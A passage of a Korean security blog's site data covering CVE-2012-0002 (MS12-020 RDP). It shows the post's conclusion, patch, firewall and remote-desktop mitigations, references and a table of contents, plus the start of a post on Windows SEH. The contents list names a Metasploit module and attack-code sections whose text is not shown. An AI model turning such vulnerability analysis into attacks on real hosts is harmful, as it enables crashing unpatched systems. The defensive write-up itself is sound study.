fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>결론</h1>\n<p>CVE-2012-0002는 2012년에 발생하였었던 취약점이었지만 현재 사회에서 원격\n통신 비중이 늘어나면서 발생할 수 있는 취약점이기에 간과해서는 안된다.\n많은 사용자들은 RDP 기반의 애플리케이션을 사용함에 있어서 보안성과\n중요성을 크게 느끼지 못해 비 정기적인 보안 업데이트를 소홀히 하면 그\n위협은 MS 취약점뿐만 아니라 그 이상이 될 수 있다.</p>\n<p>중요한 것은 과거에 발생했던 취약점이더라도 해도 보안은 작은 결\n함으로부터 시작되기 때문에 지속적으로 새로운 취약점과 잠재적인 보안\n위험에 대한 지속적인 관심을 갖어야 한다. 단순히 안티바이러스를\n설치했다고 해서 해결할 수 있는 부분이 아니다.</p>\n<h1 id=\"대응-방안\" style=\"position:relative;\"><a href=\"#%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88\" aria-label=\"대응 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>대응 방안</h1>\n<h2 id=\"보안-업데이트-설치\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\" aria-label=\"보안 업데이트 설치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보안 업데이트 설치</h2>\n<p><strong>1. 최신 보안 패치 설치</strong></p>\n<p>윈도우 명령어 wmic qfe | find “KB2621440” 사용하여 MS12-020 보안 취약점\n업데이트가 설치되었는지 확인한다. 미설치시 업데이트를 진행한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 599px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 55.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABvklEQVQoz3WR227TQBCGV3mWyE0lm0DVIFVwjdQiRYgrXhVacE4VaXMwSaB2EjsuLamT+BCfvbve9SK7CGikfPrnYkb6R3MAHxvNdutLq3HRFM/Fz5+a4nmnJV62xctOY9jvDvtdaXD1bXA9GvbGUq/bb49G0mQ8utW1r9c94HqxZUUIU0qIZVmO40AIkzhOcmJKKfuPjOVplmWMsSAIQBQlYYDSlOmLef+qI3+X1OmPmTxRbsYzeTJTJuosT3VV0WY3i7msq4quKQtNGUkD8Lf30jAUZWoYhudtMUo2m5W7dTKaYpQ49gYlUei77tbOKIEwwRhZ5gYQQoopGEQoimII0VS9U/W1PL9Xb1drO/q19rV7a2kGKzsy7NAPE4wxYywMAkAp+bNP0SNN03fvP1SEl8+PXx8+q/EvToSjVxx/XBFq/NHJYbX25vSt624ZY57n7poxxhzHAQBKpRJ4ymOlcsDBJGaM+b6/ayaE1Ov1crksCAKfi+d5XiioVqscd3B2dhpF4a75yUf2ixYUr/L/XTvLoUXQjGVsP48z+r4HMIIkTRnNTNe8e/hpLB8s04QwRijZJwjjNEWOY/0GhmocSozg8vEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image53\"\n        title=\"image53\"\n        src=\"/static/dac3e440d0f201d2b7abee615cd2f814/43142/image53.png\"\n        srcset=\"/static/dac3e440d0f201d2b7abee615cd2f814/e9ff0/image53.png 180w,\n/static/dac3e440d0f201d2b7abee615cd2f814/f21e7/image53.png 360w,\n/static/dac3e440d0f201d2b7abee615cd2f814/43142/image53.png 599w\"\n        sizes=\"(max-width: 599px) 100vw, 599px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>마이크로소프트 문서 사이트로 접속하여 점검하고 자하는 OS를 찾아 패치를\n진행하면 되겠다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">// 마이크로소프트 MS12-020 보안 패치\n\nhttps://docs.microsoft.com/ko-kr/security-updates/SecurityBulletins/2012/ms12-020</code></pre></div>\n<p><strong>2. 방화벽 작동</strong></p>\n<p>윈도우 계열의 운영체제에서 제공하는 방화벽은 항상 동작하게 한다.\n기본적인 패킷 필터링 기능을 제공하기 때문에 근본적인 침입 차단은 막을 수\n있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAB2ElEQVQoz22Q627TQBCF/f5vwCOgilIQoJaSNkrUKAqklJS0VEpMbMfr667tvXh3x+tdFEcFJDiaH0ej+UZnxnvx8uLV2cXJ6/OT0/PTN5dn70ZvP1x/vJp9Gs+vpovxzZfJbDmd394s7maf70aLxfzrw+16s43S95djTwhNiOiNVVqlSYzLrCIFLnPBqem0AdVp2YF0zg7VO9dba5xzYRR5UVxstgRXqsnww2rr74o8rykVSmuptNIAnYHO9Nba5wWDdWmCvCDKw13VOVdPJpvRdZBm/tZnTByn2M4v77/h7yuoa+cOHfcMI4Q8YwzozjnHl8vddBakrCwEzuP9dt2EUfr4WD09sZ++znKZZTQITNse0CPc2971vXOuuV9F8zlhBsDKIg2iHakaJgQTbcMY46IFEHVtGvoHtrYfvBOckxK74SqDSY5SzrntrVIq3sd1VTWUCkJ6xv8Hty0m5OirNPjhr8sCM844F1JKABBSYoS6pnH/wgAgpTx6XZb7fUSqWkrJGKeUtlIqgLaqDP0rttKqM8b91vBJg3GZ5gBwWHSIvWeUciFkVVvGjnCSIC9JMIoJ54dgehB0nWoaEccqz3WeqywTCLVJIhCSSQJCaABrbRiGvwBicGaPOc5PswAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image54\"\n        title=\"image54\"\n        src=\"/static/a2423f8fa8aabca82482fb5fd0a94217/0c69d/image54.png\"\n        srcset=\"/static/a2423f8fa8aabca82482fb5fd0a94217/e9ff0/image54.png 180w,\n/static/a2423f8fa8aabca82482fb5fd0a94217/f21e7/image54.png 360w,\n/static/a2423f8fa8aabca82482fb5fd0a94217/0c69d/image54.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>3. 원격 시스템 해제</strong></p>\n<p>이 컴퓨터에 대한 원격 지원 연결 허용 옵션 해제, 이 컴퓨터에 대한 원격\n연결 허용 안 함 선택 설정을 함으로써 MS12-020 취약점의 근본적인 차단이\n가능하다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAB60lEQVQoz1WQS3LTQBCGdUCuwAE4AEsoTsCWNRuKFBSOjeMQxY71HI8esSTLxIQ8CmL5IVkaOQmW5ZnRDCWrTEzXX1O96K//v0eAsNeVuorcUbcCmmSbwLaA0zecvuE6pudaA9fyPdv3bMPRfd8bfR8Gd7eKDoU0TO6jR85ZnudBECzCEIXRQ4KKDS42mFWilLGCsWJXjHEex4kwHV2HP6c4RjTPozCCCjz41KoddhpNWez0dGNgWl46m3LOS4oWnPPWYfPV6xeiqgms3MI5YyzLeLae+o5c+9hr1Szxq3nSGKqia0jJZFyNFEUJv3l78Pzls3fvPwhFGankCaEMk/nlBZAkQ1aAJEFF9kzNBt14fMc5p5TSEmaLx9y4CqJoIbDtMs45xmQSTH9dDEzQGdja0AF+H3j93jmUk2BcxWbbqvyXaboP4yha3J6bWvOLdlzXW3Xr9MixNMdUkp1z9V2YkHxDUJI8wZTSYBzcuLYqNtqNz/JxXWsfWVDybA3tbq4mCSHZmqAEPcEbjMNZeO177VNRVzoQnEH9TJFO1O63ePx737mKnaZIyNc5IaQ6afUnm1yOfrjG1cB2eooLVd8Cjt59mM/2navmfrkUwjmKwmVRUEpI+eZrslqR7D9RvKGU/BMhmDGGUPwXSFBMRgW61s0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image55\"\n        title=\"image55\"\n        src=\"/static/485a12f58acad3f553a6df8c45a677cc/0c69d/image55.png\"\n        srcset=\"/static/485a12f58acad3f553a6df8c45a677cc/e9ff0/image55.png 180w,\n/static/485a12f58acad3f553a6df8c45a677cc/f21e7/image55.png 360w,\n/static/485a12f58acad3f553a6df8c45a677cc/0c69d/image55.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"reference\" style=\"position:relative;\"><a href=\"#reference\" aria-label=\"reference permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reference</h2>\n<p><a href=\"https://docs\">https://docs</a>.<br>\nmicrosoft.com/ko-kr/security-updates/SecurityBulletins/2012/ms12-020</p>\n<p>(Microsoft — MS12-020 보안 패치)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/windows\">https://docs.microsoft.com/en-us/windows</a><br>\n-hardware/drivers/debugger/bug-check-0x3b—system-service-exception</p>\n<p>(Microsfot — BSOD Bug check)</p>\n<p><a href=\"https://support.microsoft\">https://support.microsoft</a><br>\n.com/ko-kr/help/186607/understanding-the-remote-desktop-protocol-rdp</p>\n<p>(Microsfot — RDP 이해)</p>\n<p><a href=\"https://docs.microsoft\">https://docs.microsoft</a><br>\n.com/en-us/windows/win32/termserv/terminal-services-virtual-channels</p>\n<p>(Microsfot — RDP 가상 채널)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/openspe\">https://docs.microsoft.com/en-us/openspe</a><br>\ncs/windows_protocols/ms-rdpbcgr/18a27ef9-6f9a-4501-b000-94b1fe3c2c10</p>\n<p>(Microsfot — X.224)</p>\n<p><a href=\"https://docs.microsoft.com/en-us/openspe\">https://docs.microsoft.com/en-us/openspe</a><br>\ncs/windows_protocols/ms-rdpbcgr/023f1e69-cfe8-4ee6-9ee0-7e759fb4e4ee</p>\n<p>(Microsoft — RDP 연결 과정)</p>\n<p><a href=\"https://community.tenable.com/\">https://community.tenable.com/</a></p>\n<p>(Tenble — Community)</p>\n<p><a href=\"https://osqa-ask.wireshark.org/questions/\">https://osqa-ask.wireshark.org/questions/</a></p>\n<p>(Wireshark — Question)</p>\n<p><a href=\"https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator\">https://nvd.nist.gov/vuln-metrics/cvss/v2-calculator</a></p>\n<p>(NVD)</p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#metasploit-%EC%B7%A8%EC%95%BD%EC%84%B1-%ED%85%8C%EC%8A%A4%ED%8A%B8\">Metasploit 취약성 테스트</a></p>\n<ul>\n<li><a href=\"#nessus-db-%EC%A0%95%EB%B3%B4-%EB%82%B4%EB%B3%B4%EB%82%B4%EA%B8%B0\">Nessus DB 정보 내보내기</a></li>\n<li><a href=\"#metasploit-workspace\">Metasploit workspace</a></li>\n<li><a href=\"#metasploit-db-%EC%97%B0%EA%B2%B0-%EC%83%81%ED%83%9C-%ED%99%95%EC%9D%B8-%EB%B0%8F-%EA%B0%80%EC%A0%B8%EC%98%A4%EA%B8%B0\">Metasploit DB 연결 상태 확인 및 가져오기</a></li>\n<li><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%A0%95%EB%B3%B4-%ED%99%95%EC%9D%B8\">점검 대상 서비스 정보 확인</a></li>\n<li><a href=\"#%EC%A0%90%EA%B2%80-%EB%8C%80%EC%83%81-%ED%98%B8%EC%8A%A4%ED%8A%B8-%EC%A0%95%EB%B3%B4\">점검 대상 호스트 정보</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B2%80%EC%83%89\">취약점 검색</a></li>\n<li><a href=\"#ms12_020_maxchannelids-%EB%AA%A8%EB%93%88\">ms12_020_maxchannelids 모듈</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%AA%A8%EB%93%88-%EC%98%B5%EC%85%98-%EC%84%A4%EC%A0%95\">모듈 옵션 설정</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9\">공격</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EB%B0%B0%EA%B2%BD\">취약점 분석 배경</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9A%94%EC%95%BD\">CVE-2012-0002 취약점 요약</a></p>\n</li>\n<li>\n<p><a href=\"#bsod-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EB%8D%A4%ED%94%84-%ED%99%98%EA%B2%BD-%EC%84%A4%EC%A0%95\">BSOD 메모리 덤프 환경 설정</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%9C%EC%9A%94\">CVE-2012-0002 취약점 개요</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EB%8C%80%EC%83%81-%EC%8B%9C%EC%8A%A4%ED%85%9C-%EB%AA%A9%EB%A1%9D\">CVE-2012-0002 대상 시스템 목록</a></p>\n</li>\n<li>\n<p><a href=\"#cve-2012-0002-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%9B%90%EB%A6%AC\">CVE-2012-0002 취약점 원리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B0%8F-%EA%B8%B0%EB%B3%B8-%EA%B0%9C%EB%85%90\">공격 기법 및 기본 개념</a></p>\n<ul>\n<li><a href=\"#uaf-use-after-free\">UAF (Use-After-Free)</a></li>\n<li><a href=\"#rdp-remote-desktop-protocol\">RDP (Remote Desktop Protocol)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#rdp-%EB%93%9C%EB%9D%BC%EC%9D%B4%EB%B2%84-%ED%8C%A8%EC%B9%98-%EC%A0%84-%ED%9B%84-%EC%BD%94%EB%93%9C-%EB%B9%84%EA%B5%90\">RDP 드라이버 패치 전 후 코드 비교</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C\">공격 코드</a></p>\n<ul>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">공격 코드 분석</a></li>\n<li><a href=\"#%EA%B3%B5%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89\">공격 코드 실행</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EA%B3%B5%EA%B2%A9-%EA%B8%B0%EB%B2%95-%EB%B6%84%EC%84%9D\">공격 기법 분석</a></p>\n<ul>\n<li><a href=\"#wireshark-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Wireshark 동적 분석</a></li>\n<li><a href=\"#windbg-%EB%8F%99%EC%A0%81-%EB%B6%84%EC%84%9D\">Windbg 동적 분석</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%EB%B3%B4%EC%95%88-%EC%97%85%EB%8D%B0%EC%9D%B4%ED%8A%B8-%EC%84%A4%EC%B9%98\">보안 업데이트 설치</a></p>\n</li>\n<li>\n<p><a href=\"#reference\">Reference</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 07, 2020","title":"CVE-2012-0002 1-day 취약점 분석","categories":"windows 1-day","author":"Zer0Luck","emoji":"🥤"},"fields":{"slug":"/cve_2012_0002_1-day/"}},"prev":{"id":"4164e698-1c6e-58a5-b3ee-a5374a38ba82","html":"<h1 id=\"seh-structured-exception-handler\" style=\"position:relative;\"><a href=\"#seh-structured-exception-handler\" aria-label=\"seh structured exception handler permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH (Structured Exception Handler)</h1>\n<ul>\n<li>SEH Windows 운영체제에서 제공하는 예외처리 시스템이다.</li>\n<li><code class=\"language-text\">__try, __except, __finally</code> 키워드로 간단히 구현할 수 있다.</li>\n<li>하드웨어 오류와 같은 특정 예외 코드 상황을 정상적으로 처리하기 위해 C에 대한 Microsoft 확장이다.</li>\n<li>SEH를 사용하면 실행이 예기치 않게 종료 되는 경우 메모리 블록 및 파일과 같은 리소스가 올바르게 해제 되도록 할 수 있다.</li>\n</ul>\n<h3 id=\"seh-매커니즘\" style=\"position:relative;\"><a href=\"#seh-%EB%A7%A4%EC%BB%A4%EB%8B%88%EC%A6%98\" aria-label=\"seh 매커니즘 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SEH 매커니즘</h3>\n<ul>\n<li>예외 처리기 , <code class=\"language-text\">_except</code> 예외에 응답 하거나 해제할 수 있는 블록</li>\n<li>Termination Handlers <code class=\"language-text\">_finally</code> 예외가 종료를 발생 시키는 지 여부에 관계 없이 항상 호출되는 종료 처리기 또는 블록</li>\n</ul>\n<h3 id=\"일반-실행의-경우-예외-처리-방법\" style=\"position:relative;\"><a href=\"#%EC%9D%BC%EB%B0%98-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\" aria-label=\"일반 실행의 경우 예외 처리 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>일반 실행의 경우 예외 처리 방법</h3>\n<ul>\n<li>OS는 프로세스 실행 중에 예외가 발생하면 프로세스에게 처리를 맡긴다.</li>\n<li>프로세스 코드에 (SEH…) 예외처 리가 구현되어 있다면, 해당 예외를 잘 처리한 후 게속 실행될 것이다.</li>\n<li>구현되어 있지 않다면 기본 예외 처리기를 동작시켜 프로세스를 종료 시킨다.</li>\n</ul>\n<h3 id=\"디버깅-실행의-경우-예외-처리-방법\" style=\"position:relative;\"><a href=\"#%EB%94%94%EB%B2%84%EA%B9%85-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\" aria-label=\"디버깅 실행의 경우 예외 처리 방법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>디버깅 실행의 경우 예외 처리 방법</h3>\n<ul>\n<li>디버깅 중에 디버기 프로세스에 에외가 발생하면 OS는 우선적으로 디버거에게 에외를 넘겨서 처리하도록 한다.</li>\n<li>디버거는 디버기에 대한 거의 모든 소유권을 가지고 있다.</li>\n<li>즉 디버기의 실행, 종료의 제어뿐만 아니라 디버기 프로세스 내부의 가상 메모리, 레지스터에 때한 읽기/쓰기 권한도 가지고 있다.</li>\n<li>이버기의 내부에서 발생하는 모든 에외(에러) 상황을 처리해야 한다.</li>\n<li>디버기의 SEH는 우선순위에서 디버거에게 밀린다.</li>\n</ul>\n<h3 id=\"디버거-실행-중지시-조치\" style=\"position:relative;\"><a href=\"#%EB%94%94%EB%B2%84%EA%B1%B0-%EC%8B%A4%ED%96%89-%EC%A4%91%EC%A7%80%EC%8B%9C-%EC%A1%B0%EC%B9%98\" aria-label=\"디버거 실행 중지시 조치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>디버거 실행 중지시 조치</h3>\n<ol>\n<li>\n<p>예외 직접 수정 : 코드, 레지스터, 메모리</p>\n<ul>\n<li>디버거는 예외가 발생한 코드 주소에 멈춰 있기 때문에 문제가 발생한 코드, 메모리, 레지스터 등을 디버거를 통하여 직접 수정하면 예외는 해결된다.</li>\n</ul>\n</li>\n<li>\n<p>예외를 디버기에게 넘겨서 처리</p>\n<ul>\n<li>디버기 내부에 이미 SEH가 존재하여 예외를 처리할 수 있다.</li>\n<li>예외 (EXCEPTION) 통지를 그대로 디버기에게 되돌려 보내서 자체 해결하도록 만들 수 있다.</li>\n<li>‘일반 실행’ 의 예외 처리와 동일한 상황이 된다.</li>\n</ul>\n</li>\n<li>\n<p>기본 예외처리기</p>\n<ul>\n<li>현재 발생한 예외를 디버거와 디버기에서 처리할 수 없다면 (혹은 의도적으로 처리하지 않는다면), 마지막으로 OS의 기본 예외 처리기에서 처리한다.</li>\n<li>디버기 프로세스가 종료되면서 디버깅은 완전히 중지된다.</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"excpetion\" style=\"position:relative;\"><a href=\"#excpetion\" aria-label=\"excpetion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Excpetion</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">UMDF_USING_NTSTATUS </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifndef</span> <span class=\"token expression\">WIN32_NO_STATUS </span></span>\n<span class=\"token comment\">/*lint -save -e767 */</span>  \n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_WAIT_0</span>                           <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token punctuation\">)</span><span class=\"token number\">0x00000000L</span><span class=\"token punctuation\">)</span> </span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">STATUS_ABANDONED_WAIT_0</span>          <span class=\"token expression\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD   <span class=\"token 